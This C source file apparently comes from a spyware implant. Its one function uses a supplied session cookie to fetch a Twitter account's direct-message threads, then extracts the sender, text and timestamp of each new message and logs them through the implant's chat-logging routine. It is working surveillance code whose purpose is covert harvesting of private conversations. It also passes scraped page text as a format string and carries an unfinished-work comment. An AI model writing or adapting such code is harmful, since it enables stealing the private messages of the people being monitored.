DWORD ParseDirectMessages(char *username, char *cookie)
{
	DWORD ret_val, response_len;
	BYTE *r_buffer = NULL, *thread_buffer = NULL;
	char *parser1, *parser2, *thread_parser1, *thread_parser2;
	char strCurrentThreadHandle[512];
	WCHAR strConversationRequest[512];
	char strDmType[24];
	char strDmContent[256];
	char strTimestamp[256];
	DWORD last_tstamp_hi, last_tstamp_lo;
	ULARGE_INTEGER act_tstamp;
	struct tm tstamp;
	char strUsernameForDm[256];
	DWORD dwHigherBatchTimestamp = 0;


#ifdef _DEBUG
		OutputDebug(L"[*] %S\n", __FUNCTION__);
#endif

	/* use a new username for twitter dm since the timestamp would be the one we got from the timeline */
	_snprintf_s(strUsernameForDm, sizeof(strUsernameForDm), _TRUNCATE, "%s-twitterdm", username);
	last_tstamp_lo = SocialGetLastTimestamp(strUsernameForDm, &last_tstamp_hi);
	if (last_tstamp_lo == SOCIAL_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;


	ret_val = XmlHttpSocialRequest(L"twitter.com", L"GET", L"/messages?last_note_ts=0&since_id=0", 443, NULL, 0, &r_buffer, &response_len, cookie, L"https://twitter.com/");

	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *) r_buffer;

	/*	Fetch the available threads
		e.g. "threads":["duilio_ebooks","duiliosagese","thegrugq_ebooks"] 
	*/
	parser1 = strstr(parser1, "\"threads\":[");
	if( !parser1 )
	{
		SAFE_FREE(r_buffer);
		return -1;
	}

	parser1 = parser1 + strlen("\"threads\":[");
	parser2 = strstr(parser1, "\"]},");

	if( !parser2 )
	{
		zfree(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser2 += 1; // skip past last '"'
	*parser2 = NULL;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - available threads %S\n", __FUNCTION__, parser1);
#endif
	
	/*	loop through the list of available threads pointed by parser1 and requests its content 
		e.g. "duilio_ebooks","duiliosagese","thegrugq_ebooks"
	*/
	for( ;; ) {
		parser1 = strchr(parser1, '"');
		if( !parser1 )
			break;

		parser1 += 1; // skip past '"'

		parser2 = strchr(parser1, '"');
		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(strCurrentThreadHandle, sizeof(strCurrentThreadHandle), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - parsing thread %S\n", __FUNCTION__, strCurrentThreadHandle);
#endif

		/*	fetch conversation
			e.g. /messages/with/conversation?id=duilio_ebooks&last_note_ts=0 
		*/
		_snwprintf_s(strConversationRequest, sizeof(strConversationRequest)/sizeof(WCHAR), _TRUNCATE, L"/messages/with/conversation?id=%S&last_note_ts=0", strCurrentThreadHandle);
		ret_val = XmlHttpSocialRequest(L"twitter.com", L"GET", strConversationRequest, 443, NULL, 0, &thread_buffer, &response_len, cookie, L"https://twitter.com/");

		/* if the request is not successful assume some serious issue happened, free resources and bail */
		if (ret_val != SOCIAL_REQUEST_SUCCESS)
		{
			zfree(thread_buffer);
			zfree(r_buffer);
			return ret_val;

		}

		/* direct message structure:
			1] start of a new message: '<div class="dm sent js-dm-item' or 'div class=\"dm received js-dm-item'
				find '<div class="dm ' (N.B space after dm) then decode whether it's send or received
			2] content:  <p class="js-tweet-text tweet-text" >MESSAGE</p>
			3] timestamp: data-time="1414592790"
		*/

		thread_parser1 = (char *) thread_buffer;

		/* parse all the messages belonging to a conversation, when there aren't messages left bail */
		for( ;; )
		{

			thread_parser1 = strstr(thread_parser1, TWITTER_DM_ITEM); // START HERE: can't find TWITTER_DM_ITEM
			if( !thread_parser1 )
				break;

			thread_parser1 += strlen(TWITTER_DM_ITEM);

			thread_parser2 = strchr(thread_parser1, ' '); // skip past sent or received
			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strDmType, sizeof(strDmType), _TRUNCATE, thread_parser1);
			thread_parser2 +=1;

			
#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm type: '%S'\n", __FUNCTION__, strDmType);
#endif		

			thread_parser1 = strstr(thread_parser2, TWITTER_DM_CONTENT);
			if( !thread_parser1 )
				break;

			thread_parser1 = strstr(thread_parser1, "\\u003e"); // encoded '>'
			if( !thread_parser1 )
				break;

			thread_parser1 += strlen("\\u003e");
			thread_parser2 = strstr(thread_parser1, "\\u003c\\/p\\u003e"); // encoded </p>
			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strDmContent, sizeof(strDmContent), _TRUNCATE, thread_parser1);
			thread_parser1 = thread_parser2 + 1;

#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm content: '%S'\n", __FUNCTION__, strDmContent);
#endif	

			thread_parser1 = strstr(thread_parser1, TWITTER_DM_TIMESTAMP_START);
			if( !thread_parser1 )
				break;
			
			thread_parser1 += strlen(TWITTER_DM_TIMESTAMP_START);
			thread_parser2 = strstr(thread_parser1, "\\\"");

			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strTimestamp, sizeof(strTimestamp), _TRUNCATE, thread_parser1);
			thread_parser1 = thread_parser2 + 1;

#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm timestamp: '%S'\n", __FUNCTION__, strTimestamp);
#endif	

			/* if the tweet is new save it , discard otherwise */
			if (!atoi(strTimestamp))
				continue;

			sscanf_s(strTimestamp, "%llu", &act_tstamp);

			if( act_tstamp.LowPart > 2000000000 || act_tstamp.LowPart <= last_tstamp_lo)
				continue;

			/* should hold true only for the first tweet in the batch */
			if( act_tstamp.LowPart > dwHigherBatchTimestamp )
				dwHigherBatchTimestamp = act_tstamp.LowPart; 

			_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
			tstamp.tm_year += 1900;
			tstamp.tm_mon++;


			/* strDmType is either 'sent' or received */
			if( !strcmp(strDmType, "sent") )
				SocialLogIMMessageA(CHAT_PROGRAM_TWITTER, strCurrentThreadHandle, strCurrentThreadHandle, username, username, strDmContent, &tstamp, FALSE);
			else if( !strcmp(strDmType, "received") )
				SocialLogIMMessageA(CHAT_PROGRAM_TWITTER, username, username, strCurrentThreadHandle, strCurrentThreadHandle, strDmContent, &tstamp, FALSE);

#ifdef _DEBUG
			OutputDebug(L"[*] %S - logging: %S <-> %S : %S %llu\n", __FUNCTION__, username, strCurrentThreadHandle, strDmContent, tstamp);
#endif


		}

		/* free loop allocated buffer */
		zfree(thread_buffer);
		thread_buffer = NULL;
	}

	/* save the most recent timestamp we got from all conversations */
	SocialSetLastTimestamp(strUsernameForDm, dwHigherBatchTimestamp, 0);

	zfree(thread_buffer); // if we bailed out of conversation parsing loop, thread_buffer is still allocated, proceed with free'ing
	zfree(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}